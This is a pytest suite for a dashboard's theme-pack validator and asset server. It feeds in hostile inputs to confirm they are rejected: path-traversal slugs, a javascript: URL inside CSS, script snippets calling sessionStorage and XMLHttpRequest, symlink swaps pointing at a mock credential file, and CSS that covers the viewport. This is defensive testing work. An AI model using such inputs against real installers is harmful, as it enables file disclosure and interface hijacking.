    def test_unsafe_slug_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("../evil", "branding/logo.svg")
        assert target is None and err is not None and "slug" in err

    def test_missing_file_not_found(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("mytheme", "branding/missing.svg")
        assert target is None and err == "not found"

    def test_symlink_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        theme = self._install(tmp_path, monkeypatch)
        outside = tmp_path / "secret.svg"
        outside.write_text("<svg/>", encoding="utf-8")
        try:
            (theme / "branding" / "link.svg").symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        target, err = _resolve_theme_asset("mytheme", "branding/link.svg")
        assert target is None and err is not None


class TestInstalledThemePersona:
    def _setup(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, text: str) -> None:
        import kiro_crew.config.loader as loader_mod

        monkeypatch.setattr(loader_mod, "config_dir", lambda: tmp_path)
        theme = tmp_path / "themes" / "mytheme"
        theme.mkdir(parents=True)
        (theme / "persona.md").write_text(text, encoding="utf-8")

    def test_reads_persona(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        self._setup(tmp_path, monkeypatch, _VALID_PERSONA)
        assert _installed_theme_persona("mytheme") == _VALID_PERSONA

    def test_caps_length(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        self._setup(tmp_path, monkeypatch, "y" * 5000)
        assert len(_installed_theme_persona("mytheme")) == 2000

    def test_bad_slug_returns_empty(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        self._setup(tmp_path, monkeypatch, _VALID_PERSONA)
        assert _installed_theme_persona("../evil") == ""

    def test_missing_file_returns_empty(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.config.loader as loader_mod
        from kiro_crew.dashboard.chat_utils import _installed_theme_persona

        monkeypatch.setattr(loader_mod, "config_dir", lambda: tmp_path)
        assert _installed_theme_persona("nosuchtheme") == ""


class TestCopyOverwrite:
    def test_reinstall_overwrites_same_name_file(self, tmp_path: Path) -> None:
        dst = tmp_path / "dst"
        # First install.
        _copy_installed_theme(_make_tiered(tmp_path / "a", level=1, extra=_L1_ASSETS), dst)
        assert (dst / "styles" / "overrides.css").read_text(encoding="utf-8") == ".chat-bubble { border-radius: 8px; }"
        # Re-install with changed content overwrites the same-name file.
        updated = dict(_L1_ASSETS)
        updated["styles/overrides.css"] = ".chat-bubble { border-radius: 2px; }"
        _copy_installed_theme(_make_tiered(tmp_path / "b", level=1, extra=updated), dst)
        assert (dst / "styles" / "overrides.css").read_text(encoding="utf-8") == ".chat-bubble { border-radius: 2px; }"

    def test_copies_all_l2_tiers(self, tmp_path: Path) -> None:
        dst = tmp_path / "dst"
        _copy_installed_theme(_make_tiered(tmp_path / "a", level=2, extra=_L2_ASSETS), dst)
        assert (dst / "overlays" / "scanner.html").is_file()
        assert (dst / "topbar" / "dark.html").is_file()
        assert (dst / "audio" / "beep.mp3").is_file()
        assert (dst / "persona.md").is_file()


class TestContentDenylistBranches:
    """Denylist branches the earlier suite left unasserted."""

    def test_overrides_javascript_rejected(self) -> None:
        assert _validate_overrides_css("a { background: javascript:alert(1); }") is not None

    def test_overlay_sessionstorage_rejected(self) -> None:
        assert _validate_overlay_html("<script>sessionStorage.getItem('k')</script>", "x.html") is not None

    def test_overlay_xhr_rejected(self) -> None:
        assert _validate_overlay_html("<script>new XMLHttpRequest()</script>", "x.html") is not None


class TestDoSCeilings:
    """Per-level entry-count and total-byte ceilings (caps monkeypatched small
    so a normal theme trips them deterministically without giant fixtures)."""

    def test_entry_count_ceiling(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "_THEME_ENTRIES_BY_LEVEL", {0: 1, 1: 1, 2: 1})
        summary, err = _validate_theme_dir(_make_theme(tmp_path))
        assert summary is None
        assert err is not None and "too many files" in err

    def test_total_bytes_ceiling(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "_THEME_TOTAL_BYTES_BY_LEVEL", {0: 10, 1: 10, 2: 10})
        summary, err = _validate_theme_dir(_make_theme(tmp_path))
        assert summary is None
        assert err is not None and "too large" in err


class TestFullL2Fixture:
    """Regression for a full Level-2 pack built in a tmp dir. Sample/test packs
    live OUTSIDE the repo now — nothing theme-bearing ships in the wheel — so
    this fixture carries persona + overlays + topbar + a font + an audio
    manifest to exercise the §3.1/§3.3 overlay/topbar/audio manifest
    declarations and the content-bound persona descriptor end to end."""

    def test_full_l2_pack_validates(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_full_l2(tmp_path))
        assert err is None, err
        assert summary is not None
        assert summary["level"] == 2
        assert summary["slug"] == "fixture-l2"

    def test_pack_has_persona(self, tmp_path: Path) -> None:
        pack = _make_full_l2(tmp_path)
        assert (pack / "persona.md").is_file()

    def test_descriptor_exposes_persona_info(self, tmp_path: Path) -> None:
        # The descriptor must surface persona sha256 + text so the frontend can
        # gate user consent on the exact persona content (content-bound consent).
        import hashlib

        pack = _make_full_l2(tmp_path)
        manifest = json.loads((pack / "theme.json").read_text(encoding="utf-8"))
        desc = _theme_asset_descriptor(pack, manifest, manifest["level"])
        text = (pack / "persona.md").read_text(encoding="utf-8", errors="replace")
        assert desc.get("hasPersona") is True
        info = desc.get("personaInfo")
        assert isinstance(info, dict)
        assert info["sha256"] == hashlib.sha256(text.encode("utf-8")).hexdigest()
        assert info["chars"] == len(text)
        assert info["text"] == text

    def test_descriptor_rejects_symlinked_persona(self, tmp_path: Path) -> None:
        # TOCTOU symlink-swap: persona.md replaced by a symlink to a file outside
        # the theme dir must NOT be read. The nolink chokepoint (O_NOFOLLOW +
        # fd-path containment) fails closed, so personaInfo is not surfaced (no
        # consent key -> persona never injected), while hasPersona stays True.
        pack = _make_full_l2(tmp_path)
        outside = tmp_path / "secret.md"
        outside.write_text(_VALID_PERSONA + "\nSECRET LEAK\n", encoding="utf-8")
        (pack / "persona.md").unlink()
        (pack / "persona.md").symlink_to(outside)
        manifest = json.loads((pack / "theme.json").read_text(encoding="utf-8"))
        desc = _theme_asset_descriptor(pack, manifest, manifest["level"])
        assert desc.get("hasPersona") is True
        assert desc.get("personaInfo") is None

    def test_pack_has_manifest_decls(self, tmp_path: Path) -> None:
        # The fixture carries overlay/topbar/audio declarations so it exercises
        # the §3.1/§3.3 machinery end to end.
        pack = _make_full_l2(tmp_path)
        manifest = json.loads((pack / "theme.json").read_text(encoding="utf-8"))
        assert isinstance(manifest.get("overlays"), list) and manifest["overlays"]
        assert isinstance(manifest.get("topbar"), dict)
        assert (pack / "audio" / "manifest.json").is_file()


# ── §3.1/§3.3 manifest declarations + §4.2 layout denylist + descriptor ──

# A pack-relative overlay/topbar HTML file set the resolvers can find on disk.
def _decl_pack(root: Path, files: dict[str, object] | None = None) -> Path:
    """Bare directory with the given rel-path files (str|bytes). Used to back
    the manifest declaration validators, which resolve ``src`` against disk."""
    d = root / "decl-pack"
    d.mkdir(parents=True, exist_ok=True)
    for rel, content in (files or {}).items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(str(content), encoding="utf-8")
    return d


# A fully-specified, valid overlay declaration (every optional field present).
_FULL_OVERLAY = {
    "id": "scanner",
    "src": "overlays/scanner.html",
    "position": "top-right",
    "zIndex": 42,
    "pointerEvents": False,
    "animation": "once",
    "trigger": "idle-30s",
}


class TestValidateOverlayDecls:
    """§3.1 theme.json ``overlays`` list validation (declarations are OPTIONAL)."""

    def _pack(self, tmp_path: Path) -> Path:
        return _decl_pack(
            tmp_path,
            {"overlays/scanner.html": "<div>x</div>", "overlays/other.html": "<div>y</div>"},
        )

    def test_valid_full_decl_passes(self, tmp_path: Path) -> None:
        assert _validate_overlay_decls({"overlays": [_FULL_OVERLAY]}, self._pack(tmp_path)) is None

    def test_no_overlays_key_backward_compat(self, tmp_path: Path) -> None:
        assert _validate_overlay_decls({}, self._pack(tmp_path)) is None

    def test_bad_id_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [{"id": "Bad Id", "src": "overlays/scanner.html"}]}, self._pack(tmp_path)
        )
        assert err is not None and "id' must match" in err

    def test_id_not_equal_file_rejected(self, tmp_path: Path) -> None:
        # id must equal the src file stem so /overlay/{id} serves it.
        err = _validate_overlay_decls(
            {"overlays": [{"id": "scanner", "src": "overlays/other.html"}]}, self._pack(tmp_path)
        )
        assert err is not None and "must be overlays/scanner.html" in err

    def test_duplicate_id_rejected(self, tmp_path: Path) -> None:
        dup = {"id": "scanner", "src": "overlays/scanner.html"}
        err = _validate_overlay_decls({"overlays": [dup, dict(dup)]}, self._pack(tmp_path))
        assert err is not None and "duplicate overlay id" in err

    def test_too_many_overlays_rejected(self, tmp_path: Path) -> None:
        decls = [{"id": f"o{i}", "src": f"overlays/o{i}.html"} for i in range(6)]
        err = _validate_overlay_decls({"overlays": decls}, self._pack(tmp_path))
        assert err is not None and "too many overlay" in err

    def test_bad_position_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [dict(_FULL_OVERLAY, position="diagonal")]}, self._pack(tmp_path)
        )
        assert err is not None and "invalid position" in err

    def test_zindex_over_max_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [dict(_FULL_OVERLAY, zIndex=10000)]}, self._pack(tmp_path)
        )
        assert err is not None and "zIndex must be an int" in err

    def test_bad_trigger_rejected(self, tmp_path: Path) -> None:
        # idle-<N>s allows 1..3 digits; idle-9999s (4 digits) is invalid.
        err = _validate_overlay_decls(
            {"overlays": [dict(_FULL_OVERLAY, trigger="idle-9999s")]}, self._pack(tmp_path)
        )
        assert err is not None and "invalid trigger" in err

    def test_missing_src_file_rejected(self, tmp_path: Path) -> None:
        err = _validate_overlay_decls(
            {"overlays": [{"id": "ghost", "src": "overlays/ghost.html"}]}, self._pack(tmp_path)
        )
        assert err is not None and "missing file" in err


class TestValidateTopbarDecls:
    """§3.1 theme.json ``topbar`` object validation (declaration OPTIONAL)."""

    def _pack(self, tmp_path: Path) -> Path:
        return _decl_pack(
            tmp_path, {"topbar/dark.html": "<div>d</div>", "topbar/light.html": "<div>l</div>"}
        )

    def test_valid_topbar_passes(self, tmp_path: Path) -> None:
        tb = {
            "topbar": {
                "dark": "topbar/dark.html",
                "light": "topbar/light.html",
                "height": "56px",
                "hideOnMobile": True,
            }
        }
        assert _validate_topbar_decls(tb, self._pack(tmp_path)) is None

    @pytest.mark.parametrize("height", ["10vh", "-5px"])
    def test_bad_height_rejected(self, tmp_path: Path, height: str) -> None:
        err = _validate_topbar_decls({"topbar": {"height": height}}, self._pack(tmp_path))
        assert err is not None and "height' must match" in err

    @pytest.mark.parametrize("height", ["9999rem", "9999em", "201px", "500px"])
    def test_over_cap_height_rejected(self, tmp_path: Path, height: str) -> None:
        # Arbiter MEDIUM: syntactically valid but viewport-consuming heights
        # (e.g. 9999rem ≈ 160000px) must be rejected — a pointer-enabled topbar
        # iframe that size would cover/intercept the dashboard (UI redress),
        # the same containment class overrides.css already enforces.
        err = _validate_topbar_decls({"topbar": {"height": height}}, self._pack(tmp_path))
        assert err is not None and "px" in err

    @pytest.mark.parametrize("height", ["28px", "200px", "3rem", "2em"])
    def test_within_cap_height_accepted(self, tmp_path: Path, height: str) -> None:
        tb = {"topbar": {"dark": "topbar/dark.html", "light": "topbar/light.html",
                         "height": height}}
        assert _validate_topbar_decls(tb, self._pack(tmp_path)) is None

    def test_declared_dark_missing_file_rejected(self, tmp_path: Path) -> None:
        d = _decl_pack(tmp_path, {"topbar/light.html": "<div>l</div>"})  # no dark.html
        err = _validate_topbar_decls({"topbar": {"dark": "topbar/dark.html"}}, d)
        assert err is not None and "missing file" in err


# A minimal but valid MP3 header for audio-manifest fixtures (mirrors _VALID_MP3).
class TestValidateAudioManifest:
    """§3.3 audio/manifest.json validation (manifest file OPTIONAL)."""

    def _audio_pack(self, tmp_path: Path, manifest: dict, *, valid_audio: bool = True) -> Path:
        head = _VALID_MP3 if valid_audio else (b"NOTAUDIO" + b"\x00" * 16)
        return _decl_pack(
            tmp_path, {"audio/manifest.json": json.dumps(manifest), "audio/chime.mp3": head}
        )

    def test_valid_triggers_and_ambient_pass(self, tmp_path: Path) -> None:
        manifest = {
            "triggers": {"notification": {"src": "audio/chime.mp3", "volume": 0.5, "maxDuration": 2}},
            "ambient": {"src": "audio/chime.mp3", "volume": 0.3, "loop": True, "fadeIn": 1},
        }
        desc, err = _validate_audio_manifest(self._audio_pack(tmp_path, manifest))
        assert err is None
        assert desc is not None
        assert "notification" in desc["triggers"]
        assert desc["ambient"] is not None

    def test_unknown_trigger_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(tmp_path, {"triggers": {"boop": {"src": "audio/chime.mp3"}}})
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "unknown audio trigger" in err

    def test_volume_over_one_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(
            tmp_path, {"triggers": {"notification": {"src": "audio/chime.mp3", "volume": 1.5}}}
        )
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "volume must be a number 0..1" in err

    def test_max_duration_over_cap_rejected(self, tmp_path: Path) -> None:
        # message-sent's per-trigger cap is 1s; 2s exceeds it.
        d = self._audio_pack(
            tmp_path, {"triggers": {"message-sent": {"src": "audio/chime.mp3", "maxDuration": 2}}}
        )
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "exceeds cap" in err

    def test_src_outside_audio_dir_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(tmp_path, {"triggers": {"notification": {"src": "other/chime.mp3"}}})
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "invalid audio 'src'" in err

    def test_non_audio_magic_bytes_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(
            tmp_path,
            {"triggers": {"notification": {"src": "audio/chime.mp3"}}},
            valid_audio=False,
        )
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "not a valid audio file" in err

    def test_legacy_version_sounds_tolerated(self, tmp_path: Path) -> None:
        # Older sample manifests carry {version, sounds}; unknown top-level keys
        # are tolerated and yield an empty trigger/ambient descriptor.
        d = self._audio_pack(tmp_path, {"version": 1, "sounds": {"x": "y"}})
        desc, err = _validate_audio_manifest(d)
        assert err is None
        assert desc == {"triggers": {}, "ambient": None}


class TestOverridesLayoutDenylist:
    """§4.2/§5.1 per-rule layout denylist with the decorative-pseudo exemption."""

    @pytest.mark.parametrize(
        "decls",
        [
            [("z-index", "10000")],
            [("display", "none")],
            [("pointer-events", "none")],
            [("position", "fixed"), ("inset", "0")],
        ],
    )
    def test_topbar_rule_rejected(self, decls: list) -> None:
        assert _overrides_layout_violation([".topbar"], decls) is not None

    def test_decorative_pseudo_exempt(self) -> None:
        # The decorative-scanline idiom on body::before/after must validate.
        decls = [("position", "fixed"), ("inset", "0"), ("pointer-events", "none")]
        assert _overrides_layout_violation(["body::before", "body::after"], decls) is None

    def test_zindex_exactly_9999_passes(self) -> None:
        assert _overrides_layout_violation([".topbar"], [("z-index", "9999")]) is None

    def test_integration_topbar_fixed_cover_rejected(self) -> None:
        assert _validate_overrides_css(".topbar{position:fixed;inset:0;}") is not None

    def test_integration_scanline_passes(self) -> None:
        assert (
            _validate_overrides_css("body::before{position:fixed;inset:0;pointer-events:none;}")
            is None
        )

    def test_brace_in_string_does_not_hide_violations(self) -> None:
        # A ``}`` inside a quoted value must NOT terminate the rule early; the
        # declarations after it (position:fixed;inset:0 + z-index) are still
        # parsed, so this viewport-hijacking rule is rejected.
        css = '.sidebar{content:"}";position:fixed;inset:0;z-index:99999}'
        assert _validate_overrides_css(css) is not None

    def test_legit_rule_with_brace_in_content_passes(self) -> None:
        # ``content:"}"`` with otherwise-safe declarations must not be
        # false-rejected by brace-blind parsing.
        assert _validate_overrides_css('.foo{content:"}";color:red}') is None

    def test_data_uri_url_with_braces_passes(self) -> None:
        # A data-URI in url() may legitimately contain ``{}``; on a decorative
        # pseudo the covering position:fixed is exempt, so the pack installs.
        css = (
            "body::before{content:'';position:fixed;inset:0;pointer-events:none;"
            'background:url("data:image/svg+xml,<svg>{}</svg>")}'
        )
        assert _validate_overrides_css(css) is None

    def test_semicolon_in_string_does_not_split_declarations(self) -> None:
        # A ``;`` inside a quoted value must stay part of that value and not be
        # mistaken for a declaration boundary — the trailing z-index is still
        # seen and rejected.
        css = '.bar{content:"a;b";z-index:12345}'
        assert _validate_overrides_css(css) is not None


class TestThemeAssetDescriptor:
    """The frontend descriptor surfaces manifest-declared placement/behaviour."""

    def test_declared_pack_surfaces_rich_shape(self, tmp_path: Path) -> None:
        manifest = {
            "level": 2,
            "name": "Bk",
            "branding": {"botName": "KarenClaw"},
            "fonts": [{"family": "Krabby Patty", "file": "krabby-patty.ttf"}],
            "overlays": [
                {
                    "id": "karen",
                    "src": "overlays/karen.html",
                    "position": "bottom-right",
                    "zIndex": 41,
                    "trigger": "continuous",
                }
            ],
            "topbar": {"dark": "topbar/dark.html", "height": "56px", "hideOnMobile": True},
        }
        d = _decl_pack(
            tmp_path,
            {
                "overlays/karen.html": "<div>k</div>",
                "topbar/dark.html": "<div>d</div>",
                "styles/fonts/krabby-patty.ttf": b"\x00\x01\x00\x00" + b"\x00" * 16,
                "audio/manifest.json": json.dumps(
                    {"triggers": {"notification": {"src": "audio/chime.mp3", "maxDuration": 2}}}
                ),
                "audio/chime.mp3": _VALID_MP3,
            },
        )
        desc = _theme_asset_descriptor(d, manifest, 2)
        # Overlays are objects carrying declared placement/behaviour.
        assert desc["overlays"][0]["position"] == "bottom-right"
        assert desc["overlays"][0]["zIndex"] == 41
        assert desc["overlays"][0]["trigger"] == "continuous"
        # Topbar height/hideOnMobile echo the manifest.
        assert desc["topbar"]["height"] == "56px"
        assert desc["topbar"]["hideOnMobile"] is True
        # Audio trigger map is parsed.
        assert "notification" in desc["audio"]["triggers"]
        # A .ttf font surfaces with format 'truetype'.
        assert desc["fonts"][0]["format"] == "truetype"

    def test_undeclared_pack_gets_default_placement(self, tmp_path: Path) -> None:
        d = _decl_pack(tmp_path, {"overlays/foo.html": "<div>f</div>"})
        desc = _theme_asset_descriptor(d, {"level": 2, "name": "U"}, 2)
        assert desc["overlays"][0]["position"] == _THEME_OVERLAY_DEFAULT_POSITION
        assert desc["overlays"][0]["zIndex"] == _THEME_OVERLAY_DEFAULT_ZINDEX


class TestDeleteLock:
    """DELETE of an installed theme dir must serialize against a concurrent
    reinstall by acquiring the same per-slug install lock before rmtree
    (Codex HIGH: unlocked delete raced the stage→swap in _do_install)."""

    def test_delete_blocks_while_install_lock_held(self, tmp_path, monkeypatch):
        import asyncio
        import time
        import types

        import kiro_crew.dashboard.theme_validate as tv_mod
        from kiro_crew.dashboard.handlers import themes as themes_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        slug = "locktheme"
        dir_target = tv_mod._installed_theme_dir(slug)
        dir_target.mkdir(parents=True)
        (dir_target / "theme.json").write_text(
            '{"name": "Lock", "level": 0}', encoding="utf-8"
        )

        req = types.SimpleNamespace(method="DELETE", match_info={"slug": slug})

        # Simulate an in-flight reinstall holding the per-slug lock.
        lock = themes_mod._theme_install_lock(slug)
        lock.acquire()
        try:
            # The handler dispatches rmtree into an executor that must first
            # acquire the held lock, so the await never completes → TimeoutError.
            with pytest.raises(asyncio.TimeoutError):
                asyncio.run(
                    asyncio.wait_for(themes_mod.api_theme_detail(req), timeout=1.0)
                )
            # Blocked, not raced: the directory is still intact.
            assert dir_target.is_dir()
        finally:
            lock.release()

        # Once the lock is free, the already-dispatched remove proceeds.
        deadline = time.time() + 5.0
        while dir_target.exists() and time.time() < deadline:
            time.sleep(0.05)
        assert not dir_target.exists()


class TestServingReadNolink:
    """Codex HIGH round 4: _resolve_theme_asset CHECKS the path but the route
    OPENED it later with a plain read — a swap-to-symlink in the window was
    followed (credential exfil via the asset endpoint). Serving reads now go
    through _read_theme_bytes_nolink (O_NOFOLLOW + containment)."""

    def _installed(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        d = tv_mod._installed_theme_dir("mypack")
        (d / "overlays").mkdir(parents=True)
        (d / "overlays" / "fx.html").write_text("<html>ok</html>", encoding="utf-8")
        return d

    def test_regular_asset_served(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from kiro_crew.dashboard.handlers.themes import _read_theme_bytes_nolink

        d = self._installed(tmp_path, monkeypatch)
        data = _read_theme_bytes_nolink("mypack", d / "overlays" / "fx.html")
        assert data == b"<html>ok</html>"

    def test_symlink_swapped_asset_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.dashboard.handlers.themes import _read_theme_bytes_nolink

        d = self._installed(tmp_path, monkeypatch)
        secret = tmp_path / "secret.txt"
        secret.write_text("AKIA-SECRET", encoding="utf-8")
        target = d / "overlays" / "fx.html"
        target.unlink()
        try:
            target.symlink_to(secret)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        # The swap happened AFTER resolution; the nolink read must refuse it.
        assert _read_theme_bytes_nolink("mypack", target) is None


class TestWindowsGate:
    """Arbiter item 4: the pack routes traverse hooks' POSIX-only
    O_NOFOLLOW + fd-real-path chokepoint (no Windows impl), so they honestly
    501 on Windows instead of 500-ing. The flag is monkeypatched True here;
    on this (POSIX) host it defaults False, so the rest of the suite exercises
    the normal path. The editor custom-record CRUD paths are NOT gated."""

    @staticmethod
    def _req(**match_info: object) -> object:
        import types

        async def _json() -> dict:
            return {"source": {"type": "local", "path": "/tmp/does-not-matter"}}

        r = types.SimpleNamespace(match_info=match_info)
        r.json = _json  # type: ignore[attr-defined]
        return r

    def test_install_501_on_windows(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import asyncio

        from kiro_crew.dashboard.handlers import themes as th_mod

        monkeypatch.setattr(th_mod, "_THEMES_WIN_UNSUPPORTED", True)
        resp = asyncio.run(th_mod.api_themes_install(self._req()))
        assert resp.status == 501
        assert b"not yet supported on Windows" in resp.body
        assert b"KiroCrew#311" in resp.body

    @pytest.mark.parametrize(
        "handler,match_info",
        [
            ("api_theme_asset", {"slug": "wintheme", "path": "branding/logo.svg"}),
            ("api_theme_overlay", {"slug": "wintheme", "id": "scanner"}),
            ("api_theme_topbar", {"slug": "wintheme", "mode": "dark"}),
        ],
    )
    def test_serving_routes_501_on_windows(
        self, monkeypatch: pytest.MonkeyPatch, handler: str, match_info: dict
    ) -> None:
        import asyncio

        from kiro_crew.dashboard.handlers import themes as th_mod

        monkeypatch.setattr(th_mod, "_THEMES_WIN_UNSUPPORTED", True)
        resp = asyncio.run(getattr(th_mod, handler)(self._req(**match_info)))
        assert resp.status == 501
        assert b"not yet supported on Windows" in resp.body

    def test_delete_installed_dir_501_on_windows(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import asyncio
        import types

        import kiro_crew.dashboard.theme_validate as tv_mod
        from kiro_crew.dashboard.handlers import themes as th_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        slug = "wintheme"
        d = tv_mod._installed_theme_dir(slug)
        d.mkdir(parents=True)
        (d / "theme.json").write_text(
            '{"name": "W", "level": 0, "formatVersion": 1}', encoding="utf-8"
        )
        monkeypatch.setattr(th_mod, "_THEMES_WIN_UNSUPPORTED", True)
        req = types.SimpleNamespace(method="DELETE", match_info={"slug": slug})
        resp = asyncio.run(th_mod.api_theme_detail(req))
        assert resp.status == 501
        assert b"not yet supported on Windows" in resp.body
        # The gate short-circuits before any rmtree — the dir is untouched.
        assert d.is_dir()

    def test_flag_false_does_not_gate(self, monkeypatch: pytest.MonkeyPatch) -> None:
        # With the flag False (the POSIX default), install is NOT short-circuited:
        # it proceeds to parse the body, so invalid JSON yields the normal 400.
        import asyncio
        import types

        from kiro_crew.dashboard.handlers import themes as th_mod

        assert th_mod._THEMES_WIN_UNSUPPORTED is False  # POSIX host default

        async def _bad_json() -> dict:
            raise ValueError("no body")

        req = types.SimpleNamespace(match_info={})
        req.json = _bad_json  # type: ignore[attr-defined]
        resp = asyncio.run(th_mod.api_themes_install(req))
        assert resp.status == 400


class TestCssParserCorpus:
    """Shared-corpus guard for the two theme-CSS parsers (PR #107 arbiter item).

    The install-time denylist (``_validate_overrides_css``) and the runtime
    positive-selector scoper (useTheme.tsx) implement different models BY
    DESIGN; this corpus pins each parser's verdict on identical inputs so any
    future drift fails a test rather than a user. The vitest twin
    (``website/src/test/themeCssCorpus.test.tsx``) asserts the ``runtimeKeeps``
    column against the SAME fixture file.
    """

    @staticmethod
    def _corpus():
        corpus_path = Path(__file__).resolve().parent / "fixtures" / "theme_css_corpus.json"
        return json.loads(corpus_path.read_text(encoding="utf-8"))["cases"]

    def test_install_verdicts_match_corpus(self) -> None:
        from kiro_crew.dashboard.theme_validate import _validate_overrides_css

        mismatches = []
        for case in self._corpus():
            err = _validate_overrides_css(case["css"])
            accepted = err is None
            if accepted != case["installAccepts"]:
                mismatches.append(f"{case['name']}: expected installAccepts={case['installAccepts']}, got {accepted} (err={err})")
        assert not mismatches, "\n".join(mismatches)

    def test_corpus_covers_both_verdict_kinds(self) -> None:
        # Guard the corpus itself: it must keep exercising accepts AND rejects,
        # and at least one documented divergence (install-accepts, runtime-drops).
        cases = self._corpus()
        assert any(c["installAccepts"] for c in cases)
        assert any(not c["installAccepts"] for c in cases)
        assert any(c["installAccepts"] and not c["runtimeKeeps"] for c in cases)
